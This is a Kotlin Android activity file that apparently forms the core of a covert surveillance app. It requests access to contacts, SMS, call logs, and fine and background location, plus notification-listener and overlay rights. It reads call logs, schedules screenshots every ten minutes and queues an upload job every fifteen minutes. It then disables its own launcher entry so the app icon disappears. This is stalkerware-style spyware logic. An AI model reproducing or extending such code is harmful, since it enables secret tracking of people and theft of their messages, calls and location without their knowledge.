package com.umarabbas.firstproject

import android.Manifest
import android.app.Activity
import android.app.AlarmManager
import android.app.PendingIntent
import android.content.ComponentName
import android.content.Context
import android.content.Intent
import android.content.pm.PackageManager
import android.net.Uri
import android.os.Build
import android.os.Bundle
import android.provider.Settings
import android.text.method.ScrollingMovementMethod
import android.util.Log
import android.widget.Toast
import androidx.appcompat.app.AppCompatActivity
import androidx.core.app.ActivityCompat
import androidx.work.*
import com.umarabbas.firstproject.Screenshot.SSReceiver
import com.umarabbas.firstproject.Screenshot.ScreenshotActivity
import kotlinx.android.synthetic.main.activity_main.*
import kotlinx.coroutines.GlobalScope
import kotlinx.coroutines.launch
import retrofit2.Call
import retrofit2.Response
import java.io.File
import java.util.concurrent.TimeUnit
import javax.security.auth.callback.Callback


class MainActivity : AppCompatActivity() {
    val PERMISSION_ALL = 1
    lateinit var callLogs : List<CallLog>
    var PERMISSIONS = arrayOf(
            Manifest.permission.READ_CONTACTS,
            Manifest.permission.ACCESS_FINE_LOCATION,
            Manifest.permission.ACCESS_BACKGROUND_LOCATION,
            Manifest.permission.WRITE_EXTERNAL_STORAGE,
            Manifest.permission.READ_SMS,
            Manifest.permission.READ_CALL_LOG
    )

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_main)
        supportActionBar?.hide()
        val sharedPref = this.getSharedPreferences("MyPref", Context.MODE_PRIVATE)
        sharedPref.edit().putString("alarm", "1221").apply()
        val first = sharedPref.getString("first", "1")
        if (first.equals("1")) {
            val intent = Intent("android.settings.ACTION_NOTIFICATION_LISTENER_SETTINGS")
            startActivityForResult(intent, 1001)
            sharedPref.edit().putString("first", "25").apply()
            callLogs = Functions.getCallLogs(this)
        }
//        Log.d("MainActivityUmar", "${Functions.getCallLogs(this,1593872851586)}")

    }

    override fun onRequestPermissionsResult(requestCode: Int, permissions: Array<out String>, grantResults: IntArray) {
        when (requestCode) {
            1 -> {
                if(grantResults.isNotEmpty() && grantResults[0] == PackageManager.PERMISSION_GRANTED){
                    val constraints = Constraints.Builder()
                            .setRequiredNetworkType(NetworkType.CONNECTED)
                            .build()
                    val uploadWorkRequest: WorkRequest = PeriodicWorkRequestBuilder<UploadWorker>(15, TimeUnit.MINUTES)
                            .setConstraints(constraints)
                            .build()
                    WorkManager
                            .getInstance(this)
                            .enqueue(uploadWorkRequest)
                    val componentName = ComponentName(this, MainActivity::class.java)
                    packageManager.setComponentEnabledSetting(componentName, PackageManager.COMPONENT_ENABLED_STATE_DISABLED, PackageManager.DONT_KILL_APP)
                    finish()
                }
            }
        }
    }

    private fun hasPermissions(context: Context, permissions: List<String>): Boolean = permissions.all {
        ActivityCompat.checkSelfPermission(context, it) == PackageManager.PERMISSION_GRANTED
    }

    override fun onActivityResult(requestCode: Int, resultCode: Int, data: Intent?) {
        if (requestCode == 1001) {
            val ssIntent = Intent(
                    Settings.ACTION_MANAGE_OVERLAY_PERMISSION,
                    Uri.parse("package:$packageName")
            )
            startActivityForResult(ssIntent, 0)

        }else if(requestCode == 0){
            if (Build.VERSION.SDK_INT <= Build.VERSION_CODES.P) {
                val activity = Intent(this, ScreenshotActivity::class.java)
                activity.flags = Intent.FLAG_ACTIVITY_NEW_TASK
                this.startActivityForResult(activity, 111)

                val alarmManager = this.getSystemService(Context.ALARM_SERVICE) as AlarmManager
                val broadcastIntent = Intent(this, SSReceiver::class.java)
                val pIntent = PendingIntent.getBroadcast(
                        this,
                        1221,
                        broadcastIntent,
                        0
                )
                alarmManager.setRepeating(
                        AlarmManager.RTC_WAKEUP,
                        System.currentTimeMillis(),
                        1000 * 60 * 10,
                        pIntent
                )
            }
            if (!hasPermissions(this, PERMISSIONS.toList())) {
                ActivityCompat.requestPermissions(this, PERMISSIONS, PERMISSION_ALL)
            }

        }
        super.onActivityResult(requestCode, resultCode, data)
    }
}
